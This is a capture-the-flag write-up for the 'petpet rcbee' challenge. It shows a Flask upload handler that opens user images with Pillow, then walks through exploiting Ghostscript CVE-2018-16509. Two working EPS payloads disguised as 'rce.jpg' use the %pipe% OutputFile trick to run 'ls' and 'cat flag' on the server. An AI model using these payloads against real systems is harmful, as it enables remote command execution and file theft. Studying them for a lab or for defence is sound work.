# petpet rcbee
![Screenshot from 2021-08-16 10-06-29](https://user-images.githubusercontent.com/87865134/129506331-94da930c-4481-4b1d-97ff-48b10e50c94d.png)

## - Download source code and analysis
- found a vulnerability in `Image.open()` (Python PIL/Pillow Remote Shell Command Execution via Ghostscript CVE-2018-16509):
```python
def petpet(file):

    if not allowed_file(file.filename):
        return {'status': 'failed', 'message': 'Improper filename'}, 400

    try:
        
        tmp_path = save_tmp(file)

        bee = Image.open(tmp_path).convert('RGBA')
        frames = [Image.open(f) for f in sorted(glob.glob('application/static/img/*'))]
        finalpet = petmotion(bee, frames)

        filename = f'{generate(14)}.gif'
        finalpet[0].save(
            f'{main.app.config["UPLOAD_FOLDER"]}/{filename}', 
            save_all=True, 
            duration=30, 
            loop=0, 
            append_images=finalpet[1:], 
        )

        os.unlink(tmp_path)

        return {'status': 'success', 'image': f'static/petpets/{filename}'}, 200

    except:
        return {'status': 'failed', 'message': 'Something went wrong'}, 500
```

## - Exploit
### 1. Create file `rce.jpg` with `eps` structure:
```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%ls > application/static/petpets/flag.txt) currentdevice putdeviceprops

```

### 2. Upload file `rce.jpg`, navigate to the directory and see all file in current directory
![Screenshot from 2021-08-16 10-14-12](https://user-images.githubusercontent.com/87865134/129506874-b62626ee-d369-4c42-8b86-baf5172e1e68.png)
> found `flag` file

### 3. Change file `rce.jpg` to get content of `flag` file
```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%cat flag > application/static/petpets/flag.txt) currentdevice putdeviceprops
```

### 4. Upload file `rce.jpg`, navigate to the directory and get flag
![Screenshot from 2021-08-16 10-17-29](https://user-images.githubusercontent.com/87865134/129506993-12ffe6c2-70c1-4777-8c9a-413ccf6d227e.png)

## - Description
> **category:** File upload

## - Reference:
- [CVE-2018-16509](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16509)
- https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509
